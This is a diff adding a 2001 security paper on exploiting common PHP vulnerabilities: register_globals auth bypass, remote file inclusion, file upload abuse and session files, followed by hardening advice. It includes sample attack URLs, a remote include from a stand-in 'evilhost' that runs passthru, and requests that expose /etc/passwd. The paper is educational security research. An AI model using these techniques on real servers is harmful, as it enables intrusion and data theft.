@@ -1,0 +1,696 @@
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+                           A Study In Scarlet
+          Exploiting Common Vulnerabilities in PHP Applications
+
+                                                                Shaun Clowes
+                                                               SecureReality
+
+"A reprint of reminisces from the Blackhat Briefings Asia 2001"
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+--- < Table of Contents > --------------------------------------------------
+
+1. Introduction
+2. Caveats and Scope
+3. Global Variables
+4. Remote Files
+5. File Upload
+6. Library Files
+7. Session Files
+8. Loose Typing And Associative Arrays
+9. Target Functions
+10. Protecting PHP
+11. Responsibility - Language vs Programmer
+12. Other
+
+"I could imagine his giving a friend a little pinch of the latest vegetable
+alkaloid, not out of malevolence, you understand, but simply out of a spirit
+of inquiry in order to have an accurate idea of the effects." - Stamford
+
+--- < 1. Introduction > ----------------------------------------------------
+
+This paper is based on my speech during the Blackhat briefings in Singapore
+and Hong Kong in April 2001. The speech was entitled "Breaking In Through
+the Front Door - The impact of Web Applications and Application Service
+Provision on Traditional Security Models". It initially discussed the trend
+towards Web Applications (and ASP) and the holes in traditional security
+methodology exposed by this trend. However, that's a long and boring
+discussion so I'll save it for the policy makers.
+
+The rest of the speech was spent talking about PHP. For those reading this
+paper who don't know what PHP is, PHP stands for "PHP Hypertext
+Preprocessor". It's a programming language (designed specifically for the
+Web) in which PHP code is embedded in web pages. When a client requests a
+page, the Web Server first passes the page to the language interpreter so
+the code can be executed, the resulting page is then returned to the client.
+
+Obviously this approach is much more suited to the page by page nature of
+web transactions than traditional CGI languages such as Perl and C. PHP (and
+to some extent other Web Languages) has the following characteristics:
+ + Interpreted
+ + Fast Execution - The interpreter is embedded in the web server, no fork()
+or setup overhead
+ + Feature Rich - Hundreds of non trivial builtin functions
+ + Simple Syntax - Non declared and loosely typed variables, 'wordy'
+function names
+
+Over the course of this paper I'm going to try to explain why I feel the
+last two characteristics make applications written in PHP easy to attack and
+hard to defend. Then I'll finish off with a rant about distribution of
+'blame' when it comes to software security.
+
+"You must study him, then ... you'll find him a knotty problem, though. I'll
+wager he learns more about you than you about him." - Stamford
+
+--- < 2. Caveats and Scope > -----------------------------------------------
+
+Almost all the observations in this paper refer to a default install of PHP
+4.0.4pl1 (with MySQL, PostgreSQL, IMAP and OpenSSL support enabled) running
+as a module under Apache 1.3.19 on a Linux machine. This of course means
+that your mileage may vary, in particular, there have been many many
+versions of PHP and they sometimes exhibit vastly different behaviour given
+the same input.
+
+Also, proponents of PHP tend to defend the language based on its extreme
+configurability. I feel very confident the vast majority of users will not
+modify the default PHP configuration at all, lest some of the amazing array
+of freely available PHP software stop working. Thus I don't feel pressured
+to defend my position based on configuration options, nonetheless I've
+included a section about how to go defending PHP applications using these
+configuration options.
+
+Finally, some people deride this kind of work as 'trivial' or 'obvious',
+particularly since I won't be discussing any specific vulnerabilities in
+particular pieces of PHP software. To prove the risks are real and that even
+programmer's that try hard fall into these traps 4 detailed advisories in
+regards to specific pieces of vulnerable software will be released shortly
+after this paper.
+
+"I have to be careful ... for I dabble with poisons a good deal." - Sherlock
+Holmes
+
+--- < 3. Global Variables > ------------------------------------------------
+
+As mentioned earlier, variables in PHP don't have to be declared, they're
+automatically created the first time they are used. Nor are they
+specifically typed, they're typed automatically based on the context in
+which they are used. This is an extremely convenient way to do things from a
+programmer's perspective (and is obviously a useful feature in a rapid
+application development language). Once a variable is created it can be
+referenced anywhere in the program (except in functions where it must be
+explicitly included in the namespace with the 'global' function). The result
+of these characteristics is that variables are rarely initialized by the
+programmer, after all, when they're first created they are empty (i.e "").
+
+Obviously the main function of a PHP based web application is usually to
+take in some client input (form variables, uploaded files, cookies etc),
+process the input and return output based on that input. In order to make it
+as simple as possible for the PHP script to access this input, it's actually
+provided in the form of PHP global variables. Take the following example
+HTML snippet:
+
+ <FORM METHOD="GET" ACTION="test.php">
+ <INPUT TYPE="TEXT" NAME="hello">
+ <INPUT TYPE="SUBMIT">
+ </FORM>
+
+Obviously this will display a text box and a submit button. When the user
+presses the submit button the PHP script test.php will be run to process the
+input. When it runs the variable $hello will contain the text the user
+entered into the text box. It's important to note the implications of this,
+this means that a remote attacker can create any variable they wish and have
+it declared in the global namespace. If instead of using the form above to
+call test.php, an attacker calls it directly with a url like
+"http://server/test.php?hello=hi&setup=no", not only will $hello = "hi" when
+the script is run but $setup will be "no" also.
+
+An example of how this can be a real problem might be a script that was
+designed to authenticate a user before displaying some important
+information. For example:
+
+ <?php
+  if ($pass == "hello")
+   $auth = 1;
+  ...
+  if ($auth == 1)
+   echo "some important information";
+ ?>
+
+In normal operation the above code will check the password to decide if the
+remote user has successfully authenticated then later check if they are
+authenticated and show them the important information. The problem is that
+the code incorrectly assumes that the variable $auth will be empty unless it
+sets it. Remembering that an attacker can create variables in the global
+namespace, a url like 'http://server/test.php?auth=1' will fail the password
+check but the script will still believe the attacker has successfully
+authenticated.
+
+To summarize the above, a PHP script _cannot trust ANY variable it has not
+EXPLICITLY set_. When you've got a rather large number of variables, this
+can be a much harder task than it may sound.
+
+Once common approach to protecting a script is to check that the variable is
+not in the array HTTP_GET/POST_VARS[] (depending on the method normally used
+to submit the form, GET or POST). When PHP is configured with track_vars
+enabled (as it is by default) variables submitted by the user are available
+both from the global variables and also as elements in the arrays mentioned
+above. However, it's important to note that there are FOUR different arrays
+for remote user input, HTTP_GET_VARS for variables submitted in the URL of
+the get request, HTTP_POST_VARS for variables submitted in the post section
+of a HTTP request, HTTP_COOKIE_VARS for variables submitted as part of the
+cookie headers in the HTTP request and to a limited degree the
+HTTP_POST_FILES array (in more recent versions of PHP). It is completely the
+end users choice which method they use to submit variables, one request can
+easily place variables in all four different arrays, a secure script needs
+to check all four (though again, the HTTP_POST_FILES array shouldn't be an
+issue except in exceptional circumstances).
+
+"No man burdens his mind with small matters unless he has some very good
+reason for doing so." - John Watson
+
+--- < 4. Remote Files > ----------------------------------------------------
+
+I'm going to repeat this frequently during this document but it bears
+repeating, PHP is an extremely feature rich language. It ships with an
+amazing amount of functionality out of the box and tries hard to make life
+as easy as possible for the coder (or web designer as the case so often is).
+From a security perspective, the more superfluous functionality offered by a
+language and the less intuitive the possibilities, the more difficult it is
+to secure applications written in it. An excellent example of this is the
+Remote Files functionality of PHP.
+
+The following piece of PHP code is designed to open a file:
+
+ <?php
+  if (!($fd = fopen("$filename", "r"))
+   echo("Could not open file: $filename<BR>\n");
+ ?>
+
+The code attempts to open the file specified in the variable $filename for
+reading and if it fails displays an error. Obviously this could be a simple
+security issue if the user can set $filename and get the script to expose
+/etc/passwd for example but one non intuitive this code could end up doing
+is reading data from another web/ftp site. The remote files functionality
+means that the majority of PHPs file handling functions can work
+transparently on remote files via HTTP and FTP. If $filename were to contain
+(for example)
+"http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir" PHP will
+actually make a HTTP request to the server "target", in this case trying to
+exploit the unicode flaw.
+This gets more interesting in the context of four other file functions that
+support remote file functionality (*** except under Windows ***), include(),
+require(), include_once() and require_once(). These functions take in a
+filename and read that file and parse it as PHP code. They're typically used
+to support the concept of code libraries, where common bits of PHP code are
+stored in files and included as needed. Now take the following piece of
+code:
+
+ <?php
+  include($libdir . "/languages.php");
+ ?>
+
+Presumably $libdir is a configuration variable that is meant to be set
+earlier in script execution to the directory where the library files are
+stored. If the attacker can cause the variable not to be set the script
+(which is typically not a tremendously difficult task) and instead submit it
+themselves they can modify the start of the path. This would normally gain
+them nothing since they still end up only being able to access languages.php
+in a directory of their choosing (poison null attacks like those possible on
+Perl don't work under PHP) but with remote files the attack can submit any
+code they wish to be executed. For example, if the attacker places a file on
+a web server called languages.php containing the following:
+
+ <?php
+  passthru("/bin/ls /etc");
+ ?>
+
+then sets $libdir to "http://<evilhost>/" upon encountering the include
+statement PHP will make a HTTP request to evilhost, retrieve the attackers
+code and execute it, returning a listing of /etc to the attackers web
+browser. Note that the attacking webserver (evilhost) can't be running PHP
+or the code will be run on the attacking machine rather than the target
+machine (see the "Other" section and its reference to SRADV00006 for an
+example of code which survives being on a PHP enabled attacking machine).
+
+"There are no crimes and no criminals in these days" - Sherlock Holmes
+
+--- < 5. File Upload > -----------------------------------------------------
+
+As if PHP hadn't already provided enough to make life easier for the
+attacker the language provides automatic support for RFC 1867 based file
+upload. Take the following form:
+
+ <FORM METHOD="POST" ENCTYPE="multipart/form-data">
+ <INPUT TYPE="FILE" NAME="hello">
+ <INPUT TYPE="HIDDEN" NAME="MAX_FILE_SIZE" VALUE="10240">
+ <INPUT TYPE="SUBMIT">
+ </FORM>
+
+This form will allow the web browser user to select a file from their local
+machine then when they click submit the file will be uploaded to the remote
+web server. This is obviously useful functionality but is PHPs response that
+makes this dangerous. When PHP first receives the request, before it has
+even BEGUN to parse the PHP script being called it will automatically
+receive the file from the remote user, it will then check that the file is
+no larger than specified in the $MAX_FILE_SIZE variable (10 kb in this case)
+and the maximum file size set in the PHP configuration file, if it passes
+these tests the file is SAVED on the local disk in a temporary directory.
+Please read that again if that doesn't make you blink, a remote user can
+send any file they wish to a PHP enabled machine and before a script has
+even specified whether or not it accepts file uploads that file is SAVED on
+the local disk.
+
+I'm going to ignore any resource exhaustion attacks that may or may not be
+possible using file upload functionality, I think they're fairly limited if
+not impossible in any case.
+
+First let's consider a script that IS designed to receive file uploads. As
+described above the file is received and saved on the local disk (in the
+location specified in the configuration for uploaded files, typically /tmp)
+with a random filename (e.g "phpxXuoXG"). The PHP script then needs
+information regarding the uploaded file to be able to process it. This is
+actually provided in two different ways, one has been in use since early
+versions of PHP 3, the other was introduced following our Advisory regarding
+the issue I'm about to describe with the former method. Suffice to say the
+problem is still alive and well, most scripts continue to use the old
+method. PHP sets four global variables to describe the uploaded file, for
+example (given the upload form above):
+
+ $hello = Filename on local machine (e.g "/tmp/phpxXuoXG")
+ $hello_size = Size in bytes of file (e.g 1024)
+ $hello_name = The original name of the file on the remote system (e.g
+"c:\\temp\\hello.txt")
+ $hello_type = Mime type of uploaded file (e.g "text/plain")
+
+The PHP script then proceeds to work on the file as located via the $hello
+variable. The problem is that it isn't immediately obvious that $hello need
+not really be a PHP set variable and can simply be set by a remote attacker.
+Take the following form input for example:
+
+
+http://vulnhost/vuln.php?hello=/etc/passwd&hello_size=10240&hello_type=text/
+plain&hello_name=hello.txt
+
+That results in the following global PHP variables (of course POST could be
+used (even cookies)):
+
+ $hello = "/etc/passwd"
+ $hello_size = 10240
+ $hello_type = "text/plain"
+ $hello_name = "hello.txt"
+
+This form input will provide exactly the variables the PHP scripts expects
+to be set by PHP, but instead of working on an uploaded file the script will
+infact be working on /etc/passwd (usually resulting in its content being
+exposed). This attack can be used to expose the contents of all sorts of
+sensitive files (in particular configuration files containing database and
+other third tier server credentials).
+
+I noted above that newer versions of PHP provide different methods for
+determining the uploaded files (it's done via the HTTP_POST_FILES[] array
+mentioned earlier). It also provides numerous functions to avoid this
+problem, for example a function to determine if a particular file is
+actually one that has been uploaded. These methods well and truly fix the
+problem but there is certainly no shortage of scripts out there still using
+the old method and still vulnerable to this sort of attack.
+
+As an alternate attack assisted by file upload consider the following
+example PHP code:
+
+ <?php
+  if (file_exists($theme)) // Checks the file exists on the local system (no
+remote files)
+   include("$theme");
+ ?>
+
+If the attacker can control $theme they can obviously use this to read any
+file on the remote system (except that content inside PHP tags e.g "<?" will
+be removed and interpreted probably crashing immediately). While this is a
+problem the attackers ultimate goal is obviously to be able to execute
+commands on the remote web server and they can't achieve that by getting the
+include statement to work on remote files as discussed earlier. They
+therefore need to get PHP code they define into a file local to the remote
+machine. This sounds like an impossible task initially but file upload comes
+to the rescue. If the attacker creates a file on their machine containing
+PHP code to be executed (for example the passthru code shown earlier) then
+creates a form which contains a file field called "theme" and uses this form
+to submit the file to the script via file upload, PHP will be kind enough to
+save the file and set $theme to the location of the attackers file on the
+local machine. The file_exists() check will then succeed and the code will
+be run.
+
+Given command execution ability on the remote webserver the attacker will
+obviously wish to attempt privilege escalation attacks or attacks on the
+third tier servers, both of which will probably require a toolset not
+present on the webserver. The file upload functionality once again makes
+this a non issue, the attacker can simply upload the attack tools, have them
+saved by PHP then use their code execution ability to chmod() the file and
+execute it. For example, they could trivially upload a local root exploit
+(through the firewall and past the IDS) and execute it.
+
+"It was easier to know it than to explain why I knew it. If you were asked
+to prove that two and two made four, you might find some difficulty, and yet
+you are quite sure of the fact" - Sherlock Holmes
+
+--- < 6. Library Files > ---------------------------------------------------
+
+I've mentioned the include() and require() functions earlier, I also said
+that they're generally used to support the concept of code libraries. What I
+mean by that is that common bits of code are put into a separate file and
+when needed in the application simply include()ed from the file. include()
+and require() will take any specified filename and read the file and parse
+its contents as PHP code.
+
+Initially when people started developing and distributing PHP applications
+they chose to distinguish library and main application code by giving
+library files the '.inc' extension. However they quickly found this was a
+bad move in general since such files aren't normally parsed as PHP code by
+the PHP interpreter. If requested from the web server they will generally
+have the full source code returned. This is because the PHP interpreter
+(when used as an apache module) determines which files to parse for PHP code
+based on the file's extension, the extensions to be interpreted can be
+chosen by the administrator but usually a combination of the extensions
+'.php', '.php4' and '.php3' is chosen. This is a real problem when sensitive
+configuration data (e.g database credentials) is placed in PHP files that
+don't have an appropriate extension since a remote attacker can easily get
+the source.
+
+The simplest solution (and the one that has since become favored) is simply
+to give EVERY file a PHP parsed extension. This prevents a request to the
+web server ever returning the raw source for a file that contains PHP code.
+The problem here is that though the source will no longer be returned, by
+requesting the file a remote attacker can have the code that is meant to be
+used in a framework of other code executed out of context. This can lead to
+all of the attacks I've described earlier.
+
+An obvious example might be the following:
+
+In main.php:
+ <?php
+  $libDir = "/libdir";
+  $langDir = "$libdir/languages";
+
+  ...
+
+  include("$libdir/loadlanguage.php":
+ ?>
+
+In libdir/loadlanguage.php:
+ <?php
+  ...
+
+  include("$langDir/$userLang");
+ ?>
+
+When libdir/loadlanguage.php is called in the defined context of main.php it
+is perfectly safe. But because libdir/loadlanguage has the extension .php
+(it doesn't have to have that extension, include() works on any file) it can
+be requested and executed by a remote attacker. When out of context an
+attacker can set $langDir and $userLang to whatever they wish.
+
+"You know a conjuror gets no credit when once he has explained his trick and
+if I show you too much of my method of working, you will come to the
+conclusion that I am a very ordinary individual after all" - Sherlock Holmes
+
+--- < 7. Session Files > ---------------------------------------------------
+
+Later versions of PHP (4 and above) provide built-in support for 'sessions'.
+Their basic purpose is to be able to save state information from page to
+page in a PHP application. For example, when a user logs in to a web site,
+the fact that they are logged in (and who they are logged in) could be saved
+in the session. When they move around the site this information will be
+available to all other PHP pages. What actually happens is that when a
+session is started (it's typically set in the configuration file to be
+automatically started on first request) a random session id is generated,
+the session persists as long as the remote browser always submits this
+session id with requests. This is most easily achieved with a cookie but can
+also be done by achieved by putting a form variable (containing the session
+id) on every page. The session is a variable store, a PHP application can
+choose to register a particular variable with the session, its value is then
+stored in a session file at the end of every PHP script and loaded into the
+variable at the start of every script. A trivial example is as follows:
+
+ <?php
+  session_destroy(); // Kill any data currently in the session
+  $session_auth = "shaun";
+  session_register("session_auth"); // Register $session_auth as a session
+variable
+ ?>
+
+Any later PHP scripts will automatically have the variable $session_auth set
+to "shaun", if they modify it later scripts will receive the modified value.
+This is obviously a very handy facility to have in a stateless environment
+like the web but caution is also necessary.
+
+One obvious problem is with insuring that variables actually come from the
+session. For example, given the above code, if a later script does the
+following:
+
+ <?php
+  if (!empty($session_auth))
+   // Grant access to site here
+ ?>
+
+This code makes the assumption that if $session_auth is set, it must have
+come from the session and not from remote input. If an attacker specified
+$session_auth in form input they can gain access to the site. Note that the
+attacker must use this attack before the variable is registered with the
+session, once a variable is in a session it will override any form input.
+
+Session data is saved in a file (in a configurable location, usually /tmp)
+named 'sess_<session id>'. This file contains the names of the variables in
+the session, their loose type, value and other data. On multi host systems
+this can be an issue since the files are saved as the user running the web
+server (typically nobody), a malicious site owner can easily create a
+session file granting themselves access on another site or even examine the
+session files looking for sensitive information.
+
+The session mechanism also supplies another convenient place that an
+attacker have their input saved into a file on the remote machine. For
+examples above where the attacker needed PHP code in a file on the remote
+machine, if they cannot use file upload they can often use the application
+and have a session variable set to a value of their choosing. They can then
+guess the location of the session file, they know the filename 'php<session
+id>' they just have to guess the directory, usually /tmp.
+
+Finally an issue I haven't found a use for is that an attacker can specify
+any session id they wish (e.g 'hello') and have a session file created with
+that id (for the example '/tmp/sess_hello'). The id can only contain
+alphanumeric characters but this might well be useful in some situations.
+
+"It is a mistake to confound strangeness with mystery" - Sherlock Holmes
+
+--- < 8. Loose Typing And Associative Arrays > -----------------------------
+
+Just a quick note about these factors.
+
+PHP is a loosely typed language, that is, a variable has different values
+depending on the context in which it is being evaluated. For example, the
+variable $hello set to the empty string "" when evaluated as a number has
+the value 0. This can sometimes lead to non intuitive results (a factor that
+was important in the exploitation of phpMyAdmin in SRADV00008). If $hello is
+set to "000" it is NOT equal to "0" nor will the function empty() return
+true.
+
+PHP arrays are associative, that is, the index to the array is a STRING and
+can be set to any string value, it is not numerically evaluated. This means
+that the array entry $hello["000"] is NOT the same as the array entry
+$hello[0].
+
+Applications need to be careful to validate user input with thought to the
+above factors and to do so consistently. I.e don't test is something is
+equal to 0 in one place and then validate it using empty() somewhere else.
+
+"We want something more than mere preaching now" - Mr. Gregson
+
+--- < 9. Target Functions > ------------------------------------------------
+
+When looking for holes in PHP applications (when you have the source code)
+it's useful to have a list of functions that are frequently misused or are
+good targets if they happen to be used in a vulnerable manner in the target
+application. If a remote user can affect the parameters to these functions
+exploitation is often possible. The following is a non exhaustive breakdown.
+
+PHP Code Execution:
+require() and include() - Both these functions read a specified file and
+interpret the contents as PHP code
+eval() - Interprets a given string as PHP code
+preg_replace() - When used with the /e modifier this function interprets the
+replacement string as PHP code
+
+Command Execution:
+exec() - Executes a specified command and returns the last line of the
+programs output
+passthru() - Executes a specified command and returns all of the output
+directly to the remote browser
+`` (backticks) - Executes the specified command and returns all the output
+in an array
+system() - Much the same as passthru() but doesn't handle binary data
+popen() - Executes a specified command and connects its output or input
+stream to a PHP file descriptor
+
+File Disclosure:
+fopen() - Opens a file and associates it with a PHP file descriptor
+readfile() - Reads a file and writes its contents directly to the remote
+browser
+file() - Reads an entire file into an array
+
+"There is mystery about this which stimulates the imagination; where there
+is no imagination there is no horror" - Sherlock Holmes
+
+--- < 10. Protecting PHP
+> --------------------------------------------------
+
+All of the attacks I've described above work perfectly on a default
+installation of PHP 4. However as I've mentioned numerous times PHP is
+endlessly configurable and many of these attacks can be defeated using those
+configuration options. There is always a price for security though, so I've
+classified the following configuration options according to their
+painfulness:
+ * = Mostly painless
+ ** = Vaguely painful
+ *** = Seriously hurts
+ **** = Chinese Water Torture
+
+Obviously my ratings are subjective so don't flame me for them. I will say
+one thing though, if you use all of the options you'll have a very secure
+PHP installation, even third party code will be reliably secure, it's just
+that most of it won't work :)
+
+**** - Set register_globals off
+This option will stop PHP creating global variables for user input. That is,
+if a user submits the form variable 'hello' PHP won't set $hello, only
+HTTP_GET/POST_VARS['hello']. This is the mother of all other options and is
+best single option for PHP security, it will also kill basically every third
+party application available and makes programming PHP a whole lot less
+convenient.
+
+*** - Set safe_mode on
+I'd love to describe exactly what safe_mode does but it isn't documented
+completely. It introduces a large variety of restrictions including:
+ - The ability to restrict which commands can be executed (by exec() etc)
+ - The ability to restrict which functions can be used
+ - Restricts file access based on ownership of script and target file
+ - Kills file upload completely
+This is a great option for ISP environments (for which it is designed) but
+it can also greatly improve the security of normal PHP environments given
+proper configuration. It can also be a complete pain in the neck.
+
+** - Set open_basedir
+This option prevents any file operations on files outside specified
+directories. This can effectively kill a variety of local include() and
+remote file attacks. Caution is still required in regards to file upload and
+session files.
+
+** - Set display_errors off, log_errors on
+This prevents PHP error messages being displayed in the returned web page.
+This can effectively limit an attackers exploration of the function of the
+script they are attacking. It can also make debugging very frustrating.
+
+* - Set allow_url_fopen off
+This stops remote files functionality. Very few sites really need this
+functionality, I absolutely recommend every site set this option.
+
+There may well be other great options I'm missing, please consult the PHP
+documentation
+
+"Our ideas must be as broad as nature if we are to interpret nature" -
+Sherlock Holmes
+
+--- < 11. Responsibility - Language Vs Programmer
+> -------------------------
+
+I contend that it is very hard to write a secure PHP application (in the
+default configuration of PHP), even if you try. It's not that PHP is a bad
+language, it's amazingly easy to program in and has more builtin features
+than any other language I know. However PHP has such emphasis on rapid
+development and feature richness that two things happen:
+ - Web designers and other non coders end up writing PHP applications. They
+have no understanding whatsoever of the security implications of the code
+they are writing. Partly this is because the mindset isn't what it should
+be. A PHP application typically runs in the most exposed environment
+possible, a universally accessible page on a web server. This means the
+mindset should be of coding a network daemon that will be routinely
+attacked, or of a setuid root application. Instead the mindset is
+functionality at all costs like it would be while writing an unprivileged
+local application. If your web server is penetrated it provides a gateway to
+the third tier, it is always a bad thing, even if the access is as nobody
+(as penetrating a PHP application will typically provide).
+ - Code behaviour becomes unpredictable. An include() statement that
+postfixes a user variable with "image.php" would normally be perfectly safe,
+the user can only specify which directory to retrieve that file from (and
+presumably cannot create a file image.php on the remote machine). When
+remote files functionality is allowed it becomes a nightmare. This is
+completely non intuitive.
+
+A lot of people blame programmer's for the code they write, I personally
+feel that if a language makes it hard for a programmer to write good code
+(particularly by being counterintuitive) the language must itself take some
+of the blame for the situation. It's not good enough to just say the
+programmer should know better. In almost every PHP application I've audited
+the programmer's have _tried_ to get it right and only been let down by
+their understanding of the intricacies of PHP. In its search for the
+ultimate functionality PHP has undermined the programmer's ability to
+understand the workings of their code in all situations.
+
+"I have all the facts in my journal, and the public shall know them" - John
+Watson
+
+--- < 12. Other
+> -----------------------------------------------------------
+
+This is just a section for various other resources.
+
+At a time when I thought no-one else was interested in PHP security, a few
+great posts/advisories/papers have popped up:
+- Rain Forest Puppy
+ RFP 2101 - "RFPlutonium to fuel your PHP-Nuke"
+ http://www.wiretrip.net/rfp/p/doc.asp?id=60&iface=2
+- João Gouveia
+ Many posts to Bugtraq, check them all out, but as a selection
+ http://www.securityfocus.com/templates/archive.pike?list=1&mid=165519
+ http://www.securityfocus.com/templates/archive.pike?list=1&mid=147104
+- Jouko Pynnonen
+ http://www.securityfocus.com/templates/archive.pike?list=1&mid=169045
+
+There are many others, sorry I didn't list them all.
+
+SecureReality have released a number of advisories regarding PHP
+applications which should serve to illustrate the problems I've outlined in
+this paper fairly well:
+- SRADV00001 - Arbitrary File Disclosure through PHP File Upload
+ http://www.securereality.com.au/sradv00001.html
+- SRADV00003 - Arbitrary File Disclosure through IMP
+ http://www.securereality.com.au/sradv00003.html
+- SRADV00006 - Remote command execution vulnerabilities in phpGroupWare
+ http://www.securereality.com.au/sradv00006.html
+- SRADV00008 - Remote command execution vulnerabilities in phpMyAdmin and
+phpPgAdmin
+ http://www.securereality.com.au/sradv00008.txt
+- SRADV00009 - Remote command execution vulnerabilities in phpSecurePages
+ http://www.securereality.com.au/sradv00009.txt
+- SRADV00010 - Remote command execution vulnerabilities in SquirrelMail
+ http://www.securereality.com.au/sradv00010.txt
+- SRADV00011 - Remote command execution vulnerabilities in WebCalendar
+ http://www.securereality.com.au/sradv00011.txt
+
+The last four were presented during my speech at the BlackHat Briefings in
+Singapore and Asia in 2001. Audio/Video of the speech will (at some stage)
+be available at http://www.blackhat.com. For anyone interested in security,
+I can't suggest more strongly that you go to the briefings.
+
+Finally, incase anyone wondered where the title came from and all those
+quotes at the end of each section, they're from the short story "A Study In
+Scarlet" by Sir Arthur Conan Doyle which was also the first story in which
+the character Sherlock Holmes appeared.
+
+"I must thank you for it all. I might not have gone but for you, and so have
+missed the finest study I ever came across: a study in scarlet eh?" -
+Sherlock Holmes
+
+
+
+
+
